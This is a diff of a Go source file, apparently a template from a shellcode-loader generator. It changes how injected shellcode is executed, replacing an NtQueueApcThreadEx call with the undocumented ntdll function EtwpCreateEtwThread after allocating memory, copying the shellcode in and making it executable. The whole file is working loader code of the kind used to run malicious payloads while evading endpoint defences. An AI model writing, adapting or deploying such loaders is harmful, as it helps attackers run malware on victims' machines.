@@ -1,11 +1,11 @@
-package main
+package EtwpCreateEtwThread
 
 import (
 	"encoding/hex"
 	"fmt"
-	"golang.org/x/sys/windows"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -22,14 +22,16 @@ func main() {
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	VirtualProtect := kernel32.NewProc("VirtualProtect")
-	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
+	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")
+	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
-	fmt.Println("ok")
 	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	oldProtect := PageReadwrite
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
-	thread, _, _ := GetCurrentThread.Call()
-	_, _, _ = NtQueueApcThreadEx.Call(thread, 1, addr, 0, 0, 0)
+	thread, _, _ := EtwpCreateEtwThread.Call(addr, uintptr(0))
+	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+
+	fmt.Println("ok")
 }
